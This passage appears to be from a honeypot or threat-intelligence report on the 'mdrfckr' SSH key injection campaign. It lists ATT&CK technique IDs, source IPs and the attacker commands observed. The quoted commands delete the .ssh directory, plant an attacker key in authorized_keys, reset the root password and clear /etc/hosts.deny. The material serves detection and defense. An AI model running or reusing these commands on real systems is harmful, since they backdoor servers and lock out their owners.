| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa  mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:7lptdNINbGgd"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `36.64.131.68`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa  mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `180.76.234.93`, `200.105.172.184`, `148.222.199.208`, `170.82.129.8`, `187.87.104.234`, `111.238.174.6`
